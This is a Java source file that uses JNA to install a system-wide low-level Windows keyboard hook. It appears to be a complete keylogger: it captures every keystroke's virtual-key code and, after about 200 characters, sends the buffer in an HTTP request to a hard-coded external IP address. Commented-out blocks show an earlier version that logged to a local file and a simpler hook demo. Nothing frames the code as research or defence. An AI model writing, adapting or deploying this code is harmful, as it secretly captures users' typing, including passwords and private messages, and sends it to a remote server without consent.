package wang.gagalulu.keylis;

import java.io.IOException;

import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;

public class KeyListener implements Runnable {
	private static HHOOK hhk;
	private static LowLevelKeyboardProc keyboardHook;
	final static User32 lib = User32.INSTANCE;
	private boolean[] on_off = null;

	public KeyListener(boolean[] on_off) {
		this.on_off = on_off;
	}

	public void run() {
		HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
		keyboardHook = new LowLevelKeyboardProc() {
			StringBuffer sb = new StringBuffer("");
			public LRESULT callback(int nCode, WPARAM wParam,
					KBDLLHOOKSTRUCT info) {
				sb.append(info.vkCode);
				if(sb.length()>200){
					final String sbnew = sb.toString();
					sb = new StringBuffer("");
					new Thread(new Runnable() {
						@Override
						public void run() {
							HttpUtil.getContentByUrl("http://182.92.1.128:8081/lovelulu/log/liskey?txt="+sbnew.toString());
							System.out.println("send");
						}
					}).start();
				}
//				SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
//				SimpleDateFormat df2 = new SimpleDateFormat(
//						"yyyy-MM-dd HH:mm:ss");
//				String fileName = df1.format(new Date());
//				String time = df2.format(new Date());
//				BufferedWriter bw1 = null;
//				BufferedWriter bw2 = null;
//				try {
//					bw1 = new BufferedWriter(new FileWriter(new File("D:\\temp\\test\\"
//							+ fileName + "_Keyboard.txt"), true));
////					bw2 = new BufferedWriter(new FileWriter(new File(".//log//"
////							+ fileName + "_Common.txt"), true));
//
//				} catch (IOException e) {
//					e.printStackTrace();
//				}
				if (on_off[0] == false) {
					System.exit(0);
				}
//				try {
////					bw1.write(time + "  ####  " + info.vkCode + "\r\n");
////					System.out.println(time + "  ####  " + (char)info.vkCode + "\r\n");
//////					bw2.write(time + "  ####  " + info.vkCode + "\r\n");
////					bw1.flush();
////					bw2.flush();
//				} catch (IOException e) {
//					e.printStackTrace();
//				}
				return lib
						.CallNextHookEx(hhk, nCode, wParam, info.getPointer());
			}
		};
		hhk = lib
				.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHook, hMod, 0);
		int result;
		MSG msg = new MSG();
		System.out.println(lib.GetMessage(msg, null, 0, 0));
		while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
			if (result == -1) {
				System.err.println("error in get message");
				break;
			} else {
				System.err.println("got message");
				lib.TranslateMessage(msg);
				lib.DispatchMessage(msg);
			}
		}
		lib.UnhookWindowsHookEx(hhk);
	}
	
	public static void main(String[] args) {
		boolean [] on_off={true};
//	    new Thread(new ProcessInfo(on_off)).start();
	    new Thread(new KeyListener(on_off)).start();
//	    new Thread(new MouseHook(on_off)).start();
	}
	
	/*private static boolean quit;
    private static HHOOK hhk;
    private static LowLevelKeyboardProc keyboardHook;
    public static void main(String[] args) {
        final User32 lib = User32.INSTANCE;
        HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        keyboardHook = new LowLevelKeyboardProc() {
         
            @Override
            public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
                 if (nCode >= 0) {
                     if (info.vkCode == 81) {
                         quit = true;
                     } 
                 }
                return lib.CallNextHookEx(hhk, nCode, wParam, info.getPointer());
            }
        };
        hhk = lib.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHook, hMod, 0);
        System.out.println("Keyboard hook installed, type anywhere, 'q' to quit");
        new Thread() {
            public void run() {
                while (!quit) {
                    try {
                        Thread.sleep(10);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                System.err.println("unhook and exit");
                lib.UnhookWindowsHookEx(hhk);
                System.exit(0);
            }
        }.start();
 
        // 以下部分是干嘛的？
        int result;
        MSG msg = new MSG();
        while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                System.err.println("error in get message");
                break;
            } else {
                System.err.println("got message");
                lib.TranslateMessage(msg);
                lib.DispatchMessage(msg);
            }
        }
        lib.UnhookWindowsHookEx(hhk);
    }*/
}
